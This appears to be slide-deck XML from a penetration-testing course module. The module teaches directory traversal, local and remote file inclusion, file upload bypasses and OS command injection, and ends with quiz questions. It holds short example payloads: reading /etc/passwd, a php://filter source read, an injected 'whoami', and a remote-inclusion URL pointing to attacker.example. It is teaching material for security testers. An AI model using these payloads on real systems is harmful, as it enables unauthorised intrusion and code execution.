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8. The second of three web application modules — named attack categories now that Module 7 established methodology and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units. File Inclusion carries the most objectives — five — reflecting how much ground LFI/RFI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8 of 24. Middle of the web application block, between methodology and SQL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Four attack families, one shared root cause: user input treated as trusted where it should not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8.1. Three objectives on the simplest and most foundational of the four attack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8.1, task 1. Absolute vs relative paths — the foundational concept the whole attack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8.1, task 2. Exploiting the vulnerability itself — walking up and out of the intended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8.1, task 3. Encoding — how a filtered traversal attempt can still succeed by encoding the characters a naive filter is looking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8.1 before file inclusion.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8.2 — five objectives, the largest unit in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8.2, task 1. The critical distinction between the two — file inclusion actually executes the included file's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8.2, task 2. File inclusion vulnerabilities in general — the concept before the two named variants.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8.2, task 3. LFI to code execution — the technique that makes LFI genuinely dangerous, not merely an information leak.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8.2, task 4. PHP wrappers — a named mechanism for extending what a file inclusion vulnerability can reach and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8.2, task 5. Remote File Inclusion — the most severe variant, since the attacker supplies the executed content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 closing the unit. LFI vs RFI is a genuinely examinable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8.2.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8.3. Three objectives on getting attacker content onto the server in the first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8.3, task 1. Understanding the vulnerability class. Connect it explicitly to the planting step file inclusion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8.3, task 2. Identifying the vulnerability — where validation is weakest and what to test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8.3, task 3. Different vectors — the tester's toolkit for defeating each type of check named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8.3 before command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8.4 — the module's final and most direct attack, moving from the web layer to the operating system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8.4, task 1. The concept — application input reaches a system shell rather than staying inside the application's own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8.4, task 2. Using OS commands for injection — the mechanics of chaining a second command onto the intended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8.4, task 3. Leveraging command injection for system access — turning confirmed injection into an interactive foothold.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slide tying the whole module together. This is the slide to keep pinned when triaging a real web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recognition of the chain and correct LFI/RFI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Testing every input that touches a file path, not just the obvious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Recognising and pursuing the chain rather than stopping at the first confirmed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Trying alternate encodings and vectors systematically before concluding a control is not exploitable.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Four units, fourteen combined objectives — the technical core of the web application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Four units in four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9 — the final module in the web application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0100" y="2385045"/>
            <a:ext cx="146685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traversal, file inclusion vulnerabilities, file upload vulnerabilities, and command injection.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2458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1988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0047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1857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1952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259535"/>
            <a:ext cx="108880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 — absolute and relative paths, exploitation, encoding for special characters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9572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1382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1477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212035"/>
            <a:ext cx="101806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Inclusion Vulnerabilities — LFI vs traversal, LFI to code execution, PHP wrappers, RFI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9097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0907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1002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164535"/>
            <a:ext cx="99083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Vulnerabilities — understanding and identifying them, exploitation vectors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68622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0432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0527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117035"/>
            <a:ext cx="911845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 — concept, OS commands, leveraging it for system access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8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308456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49805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99335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attacks, one shared root cause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217319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attack in this module exploits the same underlying mistake: user-controlled input treated as though it were trusted, safe data.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IMPACT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217319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attacks are ordered by what they ultimately grant: read access, then code inclusion, then upload, then direct command execution.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660106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4898231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EXAMINABLE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217319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categories most likely to appear as standalone, nameable findings in any practical assessment.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16959" y="3870945"/>
            <a:ext cx="20540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72567" y="4385295"/>
            <a:ext cx="8342791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and relative paths, exploiting directory traversal vulnerabilities, and using encoding for special characters.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89790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2289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8.1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absolute and relative paths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directory traversal attack manipulates how a file path is resolved. Understanding the difference between an absolute path and a relative one is the concept the whole technique depends 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PATH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Specifies a location starting from the filesystem root, unambiguous regardless of the current working directory.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PATH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Specifies a location relative to the current directory, and can include sequences that step upward out of an intended folder entirely.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795141"/>
            <a:ext cx="292224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80866"/>
            <a:ext cx="264795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8.1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3807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Exploiting directory traversal vulnerabilities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0100" y="4104829"/>
            <a:ext cx="16687800" cy="628650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1818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4285804"/>
            <a:ext cx="1675028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/download?file=../../../../etc/passwd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498112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application builds a file path from user input without restricting it, walking the path upward with repeated parent-directory sequences can reach files entirely outside the intended folder.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00100" y="6029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67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86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application that accepts a filename or path parameter is a candidate for this attack, whatever its stated purpose.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29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67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86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filtering that strips one traversal pattern but not a differently encoded or nested equivalent.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795141"/>
            <a:ext cx="292730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80866"/>
            <a:ext cx="265316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8.1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3807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encoding for special characters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0100" y="4104829"/>
            <a:ext cx="16687800" cy="628650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1818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4285804"/>
            <a:ext cx="1675028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..%2f..%2f..%2fetc%2fpasswd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498112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filter that blocks the literal traversal sequence can often be defeated by encoding the same characters differently, so the check never recognises the pattern it was written to catch.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00100" y="6029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67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86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awareness is what separates a tester who gives up at a naive filter from one who tests the same logic in a different representation.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29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67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86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principle of representation bypassing a filter recurs directly in Module 8.2's file inclusion techniques.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paths can step upward and outside an intended directory; absolute paths are unambiguous by comparison.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parent-directory sequences in an unrestricted path parameter reach files outside the intended folder.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the traversal sequence differently can defeat a naive filter looking only for the literal pattern.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97396" y="3689970"/>
            <a:ext cx="20932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628087" y="4204320"/>
            <a:ext cx="110318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Inclusion Vulnerabilities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67013" y="5271120"/>
            <a:ext cx="12753975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between file inclusion and directory traversal, understanding file inclusion vulnerabilities, leveraging LFI to obtain code execution, PHP wrapper usage, and Remote File Inclusion attacks.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34067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83597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inclusion versus directory traversal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502721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740846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059933"/>
            <a:ext cx="73188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 file's contents and returns them, typically as plain data displayed or downloaded. The file is never treated as executable code.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502721"/>
            <a:ext cx="1219200" cy="183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502721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4740846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INCLUSION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5059933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a file and treats its contents as code to be interpreted and executed by the application itself.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0100" y="6545833"/>
            <a:ext cx="1634490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distinguishing question: does the application merely display the file's contents, or does it run them?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="21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5453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8122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8.2 · Task 2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file inclusion vulnerabilities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file inclusion vulnerability exists when an application dynamically includes a file based on user input, and that input is not properly restricted to a safe, expected set of values.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included content is executed, not merely displayed, a file inclusion vulnerability can lead directly to code execution rather than only information disclosure.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INTO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File Inclusion, including a file already present on the server, and Remote File Inclusion, including a file from a location the attacker controls.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5967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8651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8.2 · Task 3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Local File Inclusion to obtain code execution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LFI alone can read local files, but combining it with a way to plant attacker-controlled content on the server — a log file, an uploaded file, or a session file — turns file inclusion into full code execution.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a file the server writes with attacker-controlled content, such as a log file, then include that same file so its content is executed.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8.3's file upload vulnerabilities provide one of the most direct paths for planting the content an LFI can later include.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628454"/>
            <a:ext cx="296316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714179"/>
            <a:ext cx="269011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8.2 · Task 4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27139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PHP wrapper usage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0100" y="3938141"/>
            <a:ext cx="16687800" cy="628650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1818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4119116"/>
            <a:ext cx="1675028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php://filter/convert.base64-encode/resource=config.php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481444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wrappers are stream handlers that a vulnerable include function may pass through, letting a tester read source code that would otherwise execute rather than display, or reach data beyond a plain filesystem path.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00100" y="586308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10120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42029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 file included directly executes rather than displaying its contents. A wrapper can read it as data instead, revealing logic that never renders on any page.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586308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10120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42029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that block obvious traversal but never anticipate a wrapper prefix, which reaches an entirely different code path in the interpreter.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628454"/>
            <a:ext cx="295877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714179"/>
            <a:ext cx="268559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8.2 · Task 5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27139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Remote File Inclusion attacks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0100" y="3938141"/>
            <a:ext cx="16687800" cy="628650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1818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4119116"/>
            <a:ext cx="1675028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/page?file=http://attacker.example/shell.txt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481444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File Inclusion includes a file from a location entirely under the attacker's control, meaning the attacker supplies the executed content directly rather than relying on content already present on the target.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00100" y="586308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10120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42029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removes the need to find a way to plant content on the server first, since the included file already lives on infrastructure the attacker owns.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586308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10120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42029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depends on server configuration permitting remote includes at all, which is disabled by default in many modern configurations — LFI is markedly more common in practice.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File Inclusion versus Remote File Inclusion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73188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 file already present on the target server. Code execution requires first planting attacker content somewhere the server will write.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826794"/>
            <a:ext cx="1219200" cy="183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826794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5064919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5384006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 file from attacker-controlled infrastructure directly. No planting step needed, but depends on remote includes being enabled.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Inclusion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 executes content; traversal merely displays it.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LFI TO CODE EXECUTION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a file the server writes, then include it so the content runs.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WRAPPERS AND RFI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wrappers read source as data; RFI supplies the executed content directly from attacker infrastructure.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96172" y="3870945"/>
            <a:ext cx="20955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505140" y="4385295"/>
            <a:ext cx="11277719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Vulnerabilities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file upload vulnerabilities, learn how to identify them, and explore different vectors to exploit them.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3236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5838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8.3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File Upload Vulnerabilities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file upload vulnerability exists when an application accepts an uploaded file without adequately restricting its type, content or destination, allowing attacker-controlled content to be planted on the server.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precisely the planting step Objective 8.2 needed to turn LFI into code execution — the two vulnerabilities frequently chain together.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10's client-side attacks reuse the same underlying idea: getting attacker content accepted and later executed by a trusting system.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5669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8344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8.3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how to identify File Upload vulnerabilities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means finding exactly where the upload validation is weak: what it checks, and, just as importantly, what it never checks at all.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validation checks only the file extension, only a client-supplied content type, or the actual file content itself.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performed once on the extension and never repeated on the file's true content, leaving an obvious gap between the two checks.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899916"/>
            <a:ext cx="296175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985641"/>
            <a:ext cx="268865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8.3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54285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different vectors to exploit File Upload vulnerabilities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20960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validation weaknesses call for different bypass vectors, each targeting exactly the gap the previous objective identified.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TRICKS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815459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extensions, double extensions, or case variation that a naive check does not anticipate.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014913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3038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CONTENT-TYPE SPOOFING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3038" y="5815459"/>
            <a:ext cx="36741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Altering the declared content type in the request while the file's actual content stays unchanged.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29725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7850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BYTE MANIPULATION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67850" y="5815459"/>
            <a:ext cx="367412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Prefixing content so a check inspecting only the file's opening bytes is satisfied while the payload still follows.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3444538" y="5258246"/>
            <a:ext cx="4043363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82663" y="5496371"/>
            <a:ext cx="39238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MANIPULATION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682663" y="5815459"/>
            <a:ext cx="367412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where the uploaded file is stored, sometimes reaching a directory the server will later execute from.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8.3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Vulnerabilities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VULNERABILITY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restriction on type, content or destination lets attacker content be planted — often feeding directly into file inclusion.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82679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064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AND EXPLOITING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38400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exactly what validation checks and what it misses, then choose the vector — extension, content type, magic bytes, or path — that targets that gap.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91502" y="3870945"/>
            <a:ext cx="21049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90626" y="4385295"/>
            <a:ext cx="8506748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 in web applications, using operating system commands for OS command injection, and leveraging it to gain system access.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93987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6612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8.4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 in web applications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 occurs when an application passes user input into a system shell command without adequately sanitising it, letting attacker input execute as part of an operating system command.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the previous three attacks, this one reaches the operating system directly rather than staying inside the web application's own logic.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that visibly shells out to a system utility — network diagnostics, file conversion, or image processing features are common culprits.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628454"/>
            <a:ext cx="296413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714179"/>
            <a:ext cx="269110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8.4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27139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operating system commands for OS command injection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0100" y="3938141"/>
            <a:ext cx="16687800" cy="628650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1818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4119116"/>
            <a:ext cx="1675028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127.0.0.1; whoami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481444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metacharacters can chain an entirely separate, attacker-controlled command onto the one the application intended to run, letting arbitrary commands execute alongside the legitimate one.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00100" y="586308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10120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42029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functionality that passes input to a shell, then test standard command-separator characters to see whether a second command executes.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586308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10120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42029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filtering that blocks one separator character but not an equivalent one the shell also honours.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6927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9639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8.4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command injection to gain system access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command injection is confirmed, it can be leveraged into an interactive foothold on the underlying operating system rather than remaining a one-off command execution.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confirmed command execution is the same class of result Module 11 works toward from a public exploit — both are converted into a full, interactive shell.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19's Metasploit payloads and Module 15/16's privilege escalation both begin exactly where this objective ends: an initial foothold on the host.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30711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80241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four attacks commonly chain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469160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707285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026372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files outside the intended folder.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448175" y="4952554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5172075" y="4469160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0200" y="4707285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10200" y="5026372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attacker-controlled content on the server.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820150" y="4952554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544050" y="4469160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2175" y="4707285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INCLUSION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2175" y="5026372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that planted content as code.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192125" y="4952554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3916025" y="4469160"/>
            <a:ext cx="35718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54150" y="4707285"/>
            <a:ext cx="340518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54150" y="5026372"/>
            <a:ext cx="318849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the OS shell directly for a foothold.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800100" y="6178897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engagement needs all four in sequence — but recognising how they connect is what turns four isolated findings into one attack path.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="21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 findings into one attack path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302472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an assessment you find an upload feature that accepts any file extension if the declared content type is set to "image/png", and separately a page parameter that includes a file from the uploads directory by filename.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objective from 8.3 explains why the upload feature is vulnerable, and which vector would you use?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908328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include vulnerability LFI or RFI, and what would you plant to escalate it to code execution?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35111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58924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908328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phrase this as a single chained finding under Module 4's anatomy, rather than two unrelated ones?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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every path-like parameter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traversal and inclusion payloads against every parameter that resembles a filename or path, not only the ones with an obviously suggestive name.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every parameter observed during Module 7's enumeration pass, and test each one systematically rather than by instinct alone.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with innocuous names that still resolve to a filesystem path internally, which instinct alone would skip.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Pursuing the chain, not just the first finding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confirmed upload or traversal vulnerability is rarely the end of the story. Ask immediately whether it can feed into file inclusion or command execution before moving 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confirming any of the four vulnerability types, explicitly check whether the other three become reachable as a result.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chained path to full code execution is a materially different finding, with materially different impact, than an isolated read of one file.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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alternate representations before giving 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concluding a filter or validation check is effective, try the same underlying attack expressed a different way — a different encoding, a different metacharacter, a different upload vector.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short checklist of alternate representations for each attack family and work through it before marking a path as blocked.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same principle Module 3's Demonstrative Methodology teaches: extend the reasoning to a case the material never explicitly covered.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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622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575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24325"/>
            <a:ext cx="2400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614863"/>
            <a:ext cx="2400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238625"/>
            <a:ext cx="21717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4124325"/>
            <a:ext cx="4305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4614863"/>
            <a:ext cx="4305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352800" y="4238625"/>
            <a:ext cx="41296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05700" y="4124325"/>
            <a:ext cx="9982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05700" y="4614863"/>
            <a:ext cx="9982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58100" y="4238625"/>
            <a:ext cx="99768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names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624388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10063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729163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4624388"/>
            <a:ext cx="4305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510063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800" y="4729163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File Inclusion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05700" y="4624388"/>
            <a:ext cx="9982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505700" y="510063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658100" y="4729163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and executing a file already present on the server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58641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214938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0" y="5586413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352800" y="5214938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File Inclusion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05700" y="5586413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7658100" y="5214938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and executing a file from attacker-controlled infrastructure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595938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07218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5700713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wrapper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0" y="5595938"/>
            <a:ext cx="4305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607218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352800" y="5700713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505700" y="5595938"/>
            <a:ext cx="9982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05700" y="607218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7658100" y="5700713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stream handler letting an include function read source as data or reach non-file resources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655796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186488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bytes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200400" y="6557963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352800" y="6186488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505700" y="6557963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7658100" y="6186488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 bytes of a file that identify its true type, sometimes checked instead of full content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00100" y="6567488"/>
            <a:ext cx="2400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" y="731043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6" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="952500" y="6672263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command injection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200400" y="6567488"/>
            <a:ext cx="4305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0" y="731043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9" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352800" y="6672263"/>
            <a:ext cx="412965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505700" y="6567488"/>
            <a:ext cx="99822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05700" y="731043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52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7658100" y="6672263"/>
            <a:ext cx="997686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input executing as part of a system shell command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15979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65509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“TRAVERSAL AND INCLUSION ARE THE SAME THING”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 displays a file's contents; inclusion executes them. That difference is the entire reason inclusion is more severe.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“RFI IS MORE COMMON THAN LFI”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depends on remote includes being enabled, which is disabled by default in many modern configurations. LFI is markedly more common in practice.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“CHECKING THE FILE EXTENSION IS ENOUGH VALIDATION”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Extension-only checks are trivially bypassed. Genuine validation inspects actual file content.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BLOCKED TRAVERSAL PAYLOAD MEANS THE PATH IS SAFE”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encoding or representation of the same payload may still succeed against a naive filter.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“THESE FOUR ATTACKS ARE UNRELATED”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22233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frequently chain: upload plants content, inclusion executes it, and command injection converts that into a full foothold.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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537099" y="3273326"/>
            <a:ext cx="32137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09633" y="3749576"/>
            <a:ext cx="106873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920013" y="5502176"/>
            <a:ext cx="1444790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attack families sharing one root cause: untrusted input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Traversal, inclusion, upload and command injection frequently chain into a single attack path.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application includes and executes a file supplied entirely from attacker-controlled infrastructure. Which vulnerability is this?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28032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File Inclusion (LFI)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31001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File Inclusion (RFI)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2133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227615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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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76225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25755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in four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24300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105275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114800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179094"/>
            <a:ext cx="128429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 walks a relative path upward and out of an intended folder; encoding can defeat a naive filter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857750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038725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048250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112544"/>
            <a:ext cx="157653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inclusion executes rather than merely displays; LFI needs planted content, RFI supplies it directly; PHP wrappers read source as data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791200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972175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5981700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045994"/>
            <a:ext cx="1160759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vulnerabilities plant attacker content when type, content or destination validation is weak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6724650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6905625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6915150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6979444"/>
            <a:ext cx="1173111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 reaches the OS shell directly, converting confirmed execution into system access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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9: SQL Injection Attacks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theory and database types, manual exploitation via UNION, error and blind payloads, exploiting MSSQL with xp_cmdshell, and automating SQL injection with SQLmap.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confident distinguishing LFI from RFI, and traversal from inclusion, without hesitation.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 of chasing a confirmed finding toward system access. Module 9 ends in exactly the same place: a foothold on the host.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2026-08-01T09:50:50Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-01T09:50:50Z</dcterms:modified>
</cp:coreProperties>
</file>